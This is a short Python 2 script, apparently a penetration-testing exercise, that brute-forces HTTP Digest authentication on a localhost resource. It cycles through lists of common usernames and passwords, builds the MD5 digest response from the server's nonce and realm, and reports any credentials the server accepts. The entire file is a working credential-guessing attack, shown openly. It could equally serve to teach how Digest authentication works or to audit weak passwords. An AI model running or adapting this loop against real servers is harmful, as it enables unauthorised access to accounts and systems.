import hashlib
import requests

users=['administrator', 'admin']
passwords=['administrator', 'admin123','admin']
protectedResource = 'http://localhost/digest-secured/'
URI='/digest-secured/'
method = 'GET'

'''
WWW-Authenticate: Digest realm="DigestRealm", nonce="bR+nKFDnBAA=ac38ed61b3b19beaf58b8a5817eefc3407ef1864", algorithm=MD5, qop="auth"

'Digest realm="DigestRealm", nonce="k2VOehPnBAA=285c96851e78f431acc1153139a74d6cdb5cdea7", algorithm=MD5, qop="auth"'
'''

foundPass = False
headers={}
for user in users:
	if foundPass:
		break
	for passwd in passwords:

		digestRealm = ''
		nonce = ''
		nc = '00000001'
		cnonce = '9876c92649472cb2' #16 bytes aleatorios.
		qop = ''

		res = requests.get(protectedResource,headers=headers)
		if res.status_code == 401:
			print 'Header from the server '+res.headers['www-authenticate']
			listHeaders = res.headers['www-authenticate'].split(',')
			for option in listHeaders:
				if "digest realm" in option.lower():
					digestRealm = option.split('=')[1].replace('"', '')
				if "nonce" in option.lower():
					nonce = option.split('=',1)[1].replace('"', '')
							
				if "qop" in option.lower():
					qop = option.split('=',1)[1].replace('"', '')
			hash1 = hashlib.md5(user+":"+digestRealm+":"+passwd).hexdigest()
			hash2 = hashlib.md5(method+":"+URI).hexdigest()

			response = hashlib.md5("%s:%s:%s:%s:%s:%s" %(hash1,nonce,nc,cnonce,qop,hash2)).hexdigest()
			
			headersDigest = {'Authorization':' Digest username="'+user+'", realm="'+digestRealm+'", nonce="'+nonce+'", uri="'+URI+'", response="'+response+'", algorithm=MD5, qop='+qop+', nc='+nc+', cnonce="'+cnonce+'"' }
			resDigest = requests.get(protectedResource,headers=headersDigest)
			if resDigest.status_code == 200:
				print 'User Found...'
				print 'User: '+user+' Pass: '+passwd				
				foundPass = True
